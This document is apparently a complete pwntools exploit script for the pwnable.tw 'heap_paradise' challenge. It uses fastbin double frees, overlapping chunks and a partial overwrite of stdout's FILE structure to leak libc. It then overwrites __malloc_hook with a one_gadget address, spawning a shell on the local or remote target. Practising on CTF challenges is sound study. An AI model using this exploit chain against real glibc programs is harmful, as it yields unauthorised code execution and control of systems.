from pwn import *

exe = ELF("./heap_paradise_patched",checksec=False)
libc = ELF("./libc_64.so.6",checksec=False)
ld = ELF("./ld-2.23.so",checksec=False)

context.binary = exe





def add(size,data):
    p.sendlineafter(b"You Choice:",b"1")
    p.sendlineafter(b"Size :",f'{size}'.encode())
    p.sendafter(b"Data :",data)


def free(index):
    p.sendlineafter(b"You Choice:",b"2")
    p.sendlineafter(b"Index :",f'{index}'.encode())
while(1):
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10308)
    else:
        p = process([exe.path])
    FAKE_CHUNK=flat(0,0,0,0x81)
    fake_next_size=flat(0,0x21,0,0x21,0,0x21,0,0x21,0,0x21)
    add(0x78,FAKE_CHUNK)#0
    add(0x68,fake_next_size)#1
    add(0x78,fake_next_size)#2
   

    free(0)
    free(2)
    free(0)


    add(0x78,b"\x20")#3
    add(0x78,b"\x00")#4
    add(0x78,b"\x00")#5

    free(1)


    add(0x78,b"A"*0x58+p64(0xa1))#6
    free(1)
    free(6)
    payload=b"A"*0x58+p64(0x71)+p16((libc.sym['_IO_2_1_stdout_'] & 0xffff) - 0x43 )
    #payload=b"A"*0x58+p64(0x71)+p16(( & 0xffff) - 0x43 )
    add(0x78,payload)#7#8

    add(0x68,b"A"*8+p64(0x21))#8
    flag=0xfbad1800 #0xfbad1800
    payload=b"\x00"*0x33+flat(flag,flag,flag,flag)+b"\x88"
    try:
        add(0x68,payload)#9
        leak=int.from_bytes(p.recv(5)+b"\x7f",'little')
        log.info('[+]LEAK:'+hex(leak))
        
        libc.address=leak-0x3c38e0
        log.info('[+]LIBC BASE:'+hex(libc.address))
        free(0)
        add(0x78,b"A"*0x18+p64(0x71))#10
        free(6)
        free(1)
        free(6)
        add(0x68,p64(libc.sym['__malloc_hook']-35))#11
        add(0x68,b"A")#12
        add(0x68,b"A")#13
        
        one=[0x45216,0x4526a,0xef6c4,0xf0567]
        add(0x68,b"A"*19+p64(libc.address+one[2]))#14
        free(1)
        free(1)
        p.interactive() 
    except:
        p.close()



